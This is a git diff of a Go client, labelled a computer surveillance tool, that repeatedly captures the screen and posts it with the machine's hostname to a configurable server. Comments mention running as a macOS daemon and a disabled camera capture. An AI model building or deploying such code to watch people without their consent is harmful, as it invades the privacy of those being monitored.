@@ -1,15 +1,14 @@
 /*
 
-Client Library for Computer Survilliance Written in GO
+Client Library for Computer Survilliance
 
+Usage:
 
- TODO
+./client --server http://192.168.0.133 -frecuency 30
 
- - Segment User ID
+This sends the data every 30 seconds to 192.168.0.133.
 
- - Wait Period
- For example: ./client -w 30  # for 30 seconds to wait for another set of requests.
-
+- TODO: Create TMP only if not present
 */
 
 package main
@@ -23,6 +22,8 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
+	"path/filepath"
+	"strconv"
 	"time"
 )
 
@@ -45,27 +46,42 @@ func main() {
 	app.Flags = []cli.Flag{
 		cli.StringFlag{
 			Name:  "server",
-			Value: "http://127.0.0.1:8000",
+			Value: "http://127.0.0.1:8000/log/",
 			Usage: "The server were we send the data",
+		},
+		cli.StringFlag{
+			Name:  "frecuency",
+			Value: "5",
+			Usage: "How frecuent we send data to the server",
 		},
 	}
 
 	app.Action = func(c *cli.Context) {
 
 		host := c.String("server")
-		mainLoop(host)
+
+		f := c.String("frecuency")
+		ff, err := strconv.Atoi(f)
+		frecuency := time.Duration(ff)
+
+		if err != nil {
+			panic(err)
+		}
+
+		mainLoop(host, frecuency)
 	}
 
 	app.Run(os.Args)
 }
 
-func mainLoop(host string) {
+func mainLoop(host string, frecuency time.Duration) {
 	for {
+		createTMPDirectory()
 		// Register as a Daemon OSX
 		// Check for update
 		httpPost(screenCapture(), host)
 		//		httpPost(facetime(), host)
-		time.Sleep(1 * time.Second)
+		time.Sleep(frecuency * time.Second)
 	}
 }
 
@@ -113,9 +129,19 @@ func abstractCommand(c string) string {
 	return string(out)
 }
 
+func computerName() string {
+	return abstractCommand("hostname")
+}
+
+func createTMPDirectory() {
+	os.Mkdir("."+string(filepath.Separator)+"/tmp", 0777)
+}
+
 func httpPost(data string, host string) {
 
-	resp, err := http.PostForm(host, url.Values{"message": {data}, "numero": {"123"}})
+	resp, err := http.PostForm(host, url.Values{"message": {data}, "hostname": {computerName()}})
+
+	fmt.Println(computerName())
 
 	if err != nil {
 		log.Print(err)
